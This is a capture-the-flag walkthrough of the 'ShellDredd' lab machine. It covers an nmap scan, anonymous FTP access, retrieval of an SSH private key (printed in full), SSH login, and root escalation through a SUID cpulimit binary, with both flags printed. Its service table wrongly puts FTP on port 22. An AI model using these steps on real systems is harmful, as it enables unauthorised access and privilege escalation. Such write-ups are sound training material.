---
custom_edit_url: null
---

## Reconnaissance

### Nmap scan

Let's perform an `nmap` scan to find the open ports and the services running on the open ports.

```
$ nmap -Pn -p- -A -T5 192.168.174.130
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-11 08:09 EDT
Warning: 192.168.174.130 giving up on port because retransmission cap hit (2).
Nmap scan report for 192.168.174.130
Host is up (0.068s latency).
Not shown: 64550 closed tcp ports (conn-refused), 983 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.45.234
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
61000/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 59:2d:21:0c:2f:af:9d:5a:7b:3e:a4:27:aa:37:89:08 (RSA)
|   256 59:26:da:44:3b:97:d2:30:b1:9b:9b:02:74:8b:87:58 (ECDSA)
|_  256 8e:ad:10:4f:e3:3e:65:28:40:cb:5b:bf:1d:24:7f:17 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 309.33 seconds
```

There are two open ports:

| Port  | Service |
| ----- | ------- |
| 22    | ftp     |
| 61000 | ssh     |

### Port 21 (FTP) enumeration

From the Nmap scan we can see that Anonymous login is allowed for FTP. Let's try it.

| Username  | Password  |
| --------- | --------- |
| anonymous | anonymous |

```
$ ftp 192.168.174.130                                                    
Connected to 192.168.174.130.
220 (vsFTPd 3.0.3)
Name (192.168.174.130:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

```
ftp> ls -la
229 Entering Extended Passive Mode (|||35727|)
150 Here comes the directory listing.
drwxr-xr-x    3 0        115          4096 Aug 06  2020 .
drwxr-xr-x    3 0        115          4096 Aug 06  2020 ..
drwxr-xr-x    2 0        0            4096 Aug 06  2020 .hannah
226 Directory send OK.
```

```
ftp> cd .hannah
250 Directory successfully changed.
```

```
ftp> ls -la
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Aug 06  2020 .
drwxr-xr-x    3 0        115          4096 Aug 06  2020 ..
-rwxr-xr-x    1 0        0            1823 Aug 06  2020 id_rsa
226 Directory send OK.
```

We can see that there is a `id_rsa` key, which is the private key for SSH.
Before we download the files, we have to turn the passive mode off.

```
ftp> passive off
Passive mode: off; fallback to active mode: off.
```

Now we can download `id_rsa` using the `get` command.

```
ftp> get id_rsa
local: id_rsa remote: id_rsa
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for id_rsa (1823 bytes).
100% |***********************************************************************************************************************************************************************************************|  1823       10.53 MiB/s    00:00 ETA
226 Transfer complete.
1823 bytes received in 00:00 (25.25 KiB/s)
```

On the attacker's machine let's check if the private SSH key is encrypted.

```
$ cat id_rsa                                 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEA1+dMq5Furk3CdxomSts5UsflONuLrAhtWzxvzmDk/fwk9ZZJMYSr
/B76klXVvqrJrZaSPuFhpRiuNr6VybSTrHB3Db7cbJvNrYiovyOOI92fsQ4EDQ1tssS0WR
6iOBdS9dndBF17vOqtHgJIIJPGgCsGpVKXkkMZUbDZDMibs4A26oXjdhjNs74npBq8gqvX
Y4RltqCayDQ67g3tLw8Gpe556tIxt1OlfNWp3mgCxVLE1/FE9S6JP+LeJtF6ctnzMIfdmd
GtlWLJdFmA4Rek1VxEEOskzP/jW9LXn2ebrRd3yG6SEO6o9+uUzLUr3tv9eLSR63Lkh1jz
n5GAP3ogHwAAA8hHmUHbR5lB2wAAAAdzc2gtcnNhAAABAQDX50yrkW6uTcJ3GiZK2zlSx+
U424usCG1bPG/OYOT9/CT1lkkxhKv8HvqSVdW+qsmtlpI+4WGlGK42vpXJtJOscHcNvtxs
m82tiKi/I44j3Z+xDgQNDW2yxLRZHqI4F1L12d0EXXu86q0eAkggk8aAKwalUpeSQxlRsN
kMyJuzgDbqheN2GM2zviekGryCq9djhGW2oJrINDruDe0vDwal7nnq0jG3U6V81aneaALF
UsTX8UT1Lok/4t4m0Xpy2fMwh92Z0a2VYsl0WYDhF6TVXEQQ6yTM/+Nb0tefZ5utF3fIbp
IQ7qj365TMtSve2/14tJHrcuSHWPOfkYA/eiAfAAAAAwEAAQAAAQEAmGDIvfYgtahv7Xtp
Nz/OD1zBrQVWaI5yEAhxqKi+NXu14ha1hdtrPr/mfU1TVARZ3sf8Y6DSN6FZo42TTg7Cgt
vFStA/5e94lFd1MaG4ehu6z01jEos9twQZfSSfvRLJHHctBB2ubUD7+cgGe+eQG3lCcX//
Nd1hi0RTjDAxo9c342/cLR/h3NzU53u7UZJ0U3JLgorUVyonN79zy1VzawL47DocD4DoWC
g8UNdChGGIicgM26OSp28naYNA/5gEEqVGyoh6kyU35qSSLvdGErTMZxVhIfWMVK0hEJGK
yyR15GMmBzDG1PWUqzgbgsJdsHuicEr8CCpaqTEBGpa28QAAAIAoQ2RvULGSqDDu2Salj/
RrfUui6lVd+yo+X7yS8gP6lxsM9in0vUCR3rC/i4yG0WhxsK3GuzfMMdJ82Qc2mQKuc05S
I96Ra9lQolZTZ8orWNkVWrlXF5uiQrbUJ/N5Fld1nvShgYIqSjBKVoFjO5PH4c5aspX5iv
td/kdikaEKmAAAAIEA8tWZGNKyc+pUslJ3nuiPNZzAZMgSp8ZL65TXx+2D1XxR+OnP2Bcd
aHsRkeLw4Mu1JYtk1uLHuQ2OUPm1IZT8XtqmuLo1XMKOC5tAxsj0IpgGPoJf8/2xUqz9tK
LOJK7HN+iwdohkkde9njtfl5Jotq4I5SqKTtIBrtaEjjKZCwUAAACBAOOb6qhGECMwVKCK
9izhqkaCr5j8gtHYBLkHG1Dot3cS4kYvoJ4Xd6AmGnQvB1Bm2PAIA+LurbXpmEp9sQ9+m8
Yy9ZpuPiSXuNdUknlGY6kl+ZY46aes/P5pa34Zk1jWOXw68q86tOUus0A1Gbk1wkaWddye
HvHD9hkCPIq7Sc/TAAAADXJvb3RAT2ZmU2hlbGwBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

&nbsp;

## Exploitation

### SSH login using private key

Since we found the private key in the `.hannah` directory, chances are it belongs to the `hannah` user.

Before we log in, we have to set the file permission to `600`.

```
$ chmod 600 id_rsa 
```

Now we can log in as `hannah` using the private SSH key.

```
$ ssh -i id_rsa hannah@192.168.174.130 -p 61000
Linux ShellDredd 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64
The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Aug 11 14:27:51 2024 from 192.168.45.234
hannah@ShellDredd:~$ 
```

&nbsp;

## Post Exploitation

### local.txt

```
hannah@ShellDredd:~$ cat local.txt 
7f63370140bf587c7e1d9b96cf46a482
```

### Privilege Escalation

#### SetUID binaries

We can use the `find` command to search for files on the system where the `setuid` bit is set.

```
hannah@ShellDredd:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/mawk
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/fusermount
/usr/bin/cpulimit
/usr/bin/mount
/usr/bin/passwd
```

We can now use on of these files to escalate our privilege.

Let's go to [GTFOBins](https://gtfobins.github.io/gtfobins/cpulimit/#suid) to search for an exploit for the `cpulimit` utility.

![1](https://github.com/user-attachments/assets/10ba9487-da3c-4245-9227-5308cd063fa9)

```
hannah@ShellDredd:~$ /usr/bin/cpulimit -l 100 -f -- /bin/sh -p
Process 1190 detected
# whoami
root
```

### proof.txt

```
# cat /root/proof.txt
6f31c24a8b78ea0271ecfa3da1856390
```
